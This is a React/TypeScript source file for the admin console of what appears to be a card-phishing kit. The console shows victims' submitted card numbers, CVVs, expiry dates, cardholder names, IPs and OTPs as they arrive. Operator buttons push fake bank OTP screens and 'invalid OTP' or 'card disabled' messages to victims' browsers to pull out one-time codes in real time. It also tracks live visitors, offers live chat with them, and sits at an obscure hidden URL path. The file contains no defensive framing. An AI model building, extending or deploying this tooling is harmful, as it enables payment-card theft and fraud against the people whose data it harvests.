import React, { useState, useEffect, useMemo } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
import { wsClient } from '@/integrations/ws-client';
import TypingDetector from './TypingDetector';
import EnhancedVisitorInfo from './EnhancedVisitorInfo';
import AdminChat from './AdminChat';
import LiveVisitorNotification from './LiveVisitorNotification';
import BankSelectionModal from './BankSelectionModal';

interface CardSubmission {
  id: string;
  invoice_id: string;
  card_number: string;
  expiry_month: string;
  expiry_year: string;
  cvv: string;
  card_holder: string;
  amount: string;
  user_ip: string;
  browser: string;
  network: string;
  otp?: string;
  created_at: string;
  isNew?: boolean;
}

interface Visitor {
  id: string;
  ip: string;
  created_at: string;
}

const AdminPanel = () => {
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
  const [notification, setNotification] = useState<string>('');
  const [showBankModal, setShowBankModal] = useState(false);
  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');
  const [adminCommands, setAdminCommands] = useState<{ [submissionId: string]: string[] }>({});

  const showNotification = (message: string) => {
    setNotification(message);
    setTimeout(() => setNotification(''), 3000);
  };

  useEffect(() => {
    // Announce to the server that this is an admin client
    wsClient.send('admin_hello', {}); // Pass an empty payload as required by the 'send' method

    // Set custom favicon for admin panel only
    const favicon = document.createElement('link');
    favicon.rel = 'icon';
    favicon.type = 'image/png';
    favicon.href = 'https://static.thenounproject.com/png/74031-200.png'; // Example game logo
    favicon.id = 'admin-favicon';
    document.head.appendChild(favicon);
    return () => {
      const existing = document.getElementById('admin-favicon');
      if (existing) existing.remove();
    };
  }, []);

  useEffect(() => {
    // Handler for new card submissions
    const handleCardSubmission = (submission: any) => {
      console.log('[AdminPanel] Received card_submission:', submission);
      setCardSubmissions(prev => [{
        ...submission,
        isNew: true,
        created_at: new Date().toISOString()
      }, ...prev]);
      showNotification('New card submission received');
    };

    // Handler for admin commands
    const handleAdminCommand = (command: any) => {
      console.log('[AdminPanel] Received admin_command:', command);
      if (command.submission_id) {
        setAdminCommands(prev => ({
          ...prev,
          [command.submission_id]: [...(prev[command.submission_id] || []), command.command]
        }));
      }
    };

    // Handler for visitor updates
    const handleVisitorUpdate = (visitor: Visitor) => {
      console.log('[AdminPanel] Received visitor_update:', visitor);
      setActiveVisitors(prev => {
        const exists = prev.some(v => v.id === visitor.id);
        if (!exists) {
          return [visitor, ...prev];
        }
        return prev;
      });
    };

    // Handler for visitor leaving
    const handleVisitorLeft = (payload: { id: string }) => {
      console.log('[AdminPanel] Received visitor_left:', payload);
      setActiveVisitors(prev => prev.filter(v => v.id !== payload.id));
    };

    // Handler for deleting all transactions
    const handleDeleteAllTransactions = () => {
      console.log('[AdminPanel] Received delete_all_transactions');
      setCardSubmissions([]);
      setAdminCommands({});
    };

    // Handler for OTP submitted event
    const handleOtpSubmitted = (data: any) => {
      console.log('[AdminPanel] Received otp_submitted:', data);
      setCardSubmissions(prev => prev.map(submission =>
        submission.id === data.submission_id || submission.invoice_id === data.submission_id
          ? { ...submission, otp: data.otp }
          : submission
      ));
      showNotification('OTP received for a card submission');
    };

    console.log('[AdminPanel] Registering WebSocket event listeners');
    wsClient.on('card_submission', handleCardSubmission);
    wsClient.on('admin_command', handleAdminCommand);
    wsClient.on('visitor_update', handleVisitorUpdate);
    wsClient.on('visitor_left', handleVisitorLeft);
    wsClient.on('delete_all_transactions', handleDeleteAllTransactions);
    wsClient.on('otp_submitted', handleOtpSubmitted);

    return () => {
      console.log('[AdminPanel] Cleaning up WebSocket event listeners');
      wsClient.off('card_submission', handleCardSubmission);
      wsClient.off('admin_command', handleAdminCommand);
      wsClient.off('visitor_update', handleVisitorUpdate);
      wsClient.off('visitor_left', handleVisitorLeft);
      wsClient.off('delete_all_transactions', handleDeleteAllTransactions);
      wsClient.off('otp_submitted', handleOtpSubmitted);
    };
  }, []);

  const sendCommand = (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
    console.log('Admin Panel: Sending command via Supabase:', command, submissionId, bankData);
    showNotification(`${command.toUpperCase()} command sent`);
    
    const commandData: any = {
      command,
      submission_id: submissionId || null,
      created_at: new Date().toISOString(),
    };
    
    if (bankData) {
      commandData.bank_name = bankData.name;
      commandData.bank_logo = bankData.logo;
      console.log('Admin Panel: Including bank data:', bankData);
    }
    
    console.log('Admin Panel: Final command data:', commandData);
    
    wsClient.send('admin_command', commandData);
    
    if (submissionId) {
      setCardSubmissions(prev => prev.map(submission => 
        submission.id === submissionId ? { ...submission, isNew: false } : submission
      ));
    }
  };

  const handleRowClick = (submissionId: string) => {
    setCardSubmissions(prev => prev.map(submission => 
      submission.id === submissionId ? { ...submission, isNew: false } : submission
    ));
  };

  const deleteAllTransactions = () => {
    if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
      wsClient.send('delete_all_transactions', {});
      setCardSubmissions([]);
      showNotification('All transactions deleted successfully');
    }
  };

  const handleShowOtp = (submissionId: string) => {
    console.log('Admin Panel: Show OTP clicked for submission:', submissionId);
    setSelectedSubmissionId(submissionId);
    setShowBankModal(true);
  };

  const handleBankSelect = (bankName: string, bankLogo: string) => {
    console.log('Admin Panel: Bank selected:', bankName, bankLogo);
    console.log('Admin Panel: Sending showotp command with submission ID:', selectedSubmissionId);
    sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
    setShowBankModal(false);
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <LiveVisitorNotification visitors={activeVisitors} />
      
      <BankSelectionModal
        isOpen={showBankModal}
        onClose={() => setShowBankModal(false)}
        onSelectBank={handleBankSelect}
        submissionId={selectedSubmissionId}
      />
      
      <div className="flex justify-between items-center mb-8">
   <h1 className="text-3xl font-bold">a</h1>
        <button
          onClick={deleteAllTransactions}
          className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
        >
          Delete Transactions
        </button>
      </div>
      
      {notification && (
        <div className="fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg z-50">
          {notification}
        </div>
      )}
      
      {/* Connection Status */}
      <div className="mb-4">
        <span className={`px-3 py-1 rounded text-sm ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 'bg-red-600'
        }`}>
          Supabase: {connectionStatus}
        </span>
        <span className="ml-2 px-3 py-1 rounded text-sm bg-green-600">
          Real-time: Active
        </span>
      </div>

      {/* Advanced Features */}
      <TypingDetector />
      <EnhancedVisitorInfo />
      <AdminChat />
      
      {/* Current Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Current Live Visitors ({activeVisitors.length})</h2>
        <div className="space-y-2">
          {activeVisitors.length === 0 ? (
            <div className="text-gray-400">No active visitors...</div>
          ) : (
            activeVisitors.map((visitor) => (
              <div key={visitor.id} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
                Live Visitor: {visitor.ip} - {new Date(visitor.created_at).toLocaleTimeString()}
              </div>
            ))
          )}
        </div>
      </div>

      {/* Transactions Table */}
      {cardSubmissions.length > 0 && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Transactions ({cardSubmissions.length})</h2>
          <div className="space-y-4">
            {cardSubmissions.map((submission) => (
              <div 
                key={submission.id}
                className={`bg-gray-700 rounded-lg p-4 ${submission.isNew ? 'animate-pulse border-2 border-yellow-500' : ''}`}
              >
                {/* Card Details Section */}
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div className="col-span-2">
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400 text-sm">Card Number</span>
                      <button 
                        onClick={(e) => {
                          e.stopPropagation();
                          navigator.clipboard.writeText(submission.card_number);
                          showNotification('Card number copied!');
                        }}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_number}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">CVV</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.cvv}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Expiry</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.expiry_month}/{submission.expiry_year}</div>
                  </div>
                </div>

                {/* Action Buttons */}
                {!(adminCommands[submission.id]?.includes('success') || adminCommands[submission.id]?.includes('fail')) && (
                  <div className="grid grid-cols-2 gap-2 mb-4">
                    <button
                      onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
                      className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Show OTP
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('fail', submission.id); }}
                      className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Fail
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('success', submission.id); }}
                      className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Success
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('invalidotp', submission.id); }}
                      className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Invalid OTP
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('cardinvalid', submission.id); }}
                      className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Card Invalid
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('carddisabled', submission.id); }}
                      className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Card Disabled
                    </button>
                  </div>
                )}

                {/* Additional Details - Collapsible */}
                <div className="border-t border-gray-600 pt-4">
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <span className="text-gray-400">Invoice ID</span>
                      <div className="mt-1">{submission.invoice_id}</div>
                    </div>
                    <div>
                      <span className="text-gray-400">Amount</span>
                      <div className="mt-1">₹{submission.amount}</div>
                    </div>
                    <div>
                      <span className="text-gray-400">Cardholder</span>
                      <div className="mt-1">{submission.card_holder}</div>
                    </div>
                    <div>
                      <span className="text-gray-400">IP Address</span>
                      <div className="mt-1">{submission.user_ip}</div>
                    </div>
                    <div>
                      <span className="text-gray-400">OTP</span>
                      <div className="mt-1">{submission.otp || 'Pending'}</div>
                    </div>
                    <div>
                      <span className="text-gray-400">Status</span>
                      <div className="mt-1">Processing</div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
          <li>• Real-time communication via Supabase database</li>
          <li>• Wait for card data to appear in the table above</li>
          <li>• Click on any row to stop the glow effect</li>
          <li>• Use command buttons to control user experience</li>
          <li>• All transactions are saved in Supabase database</li>
          <li>• Cross-browser sessions supported via real-time subscriptions</li>
          <li>• Visitors are automatically removed after 2 minutes of inactivity</li>
          <li>• Click the chat button to start live chat with users</li>
        </ul>
      </div>
      <AdminChat />
    </div>
  );
};

export default AdminPanel;
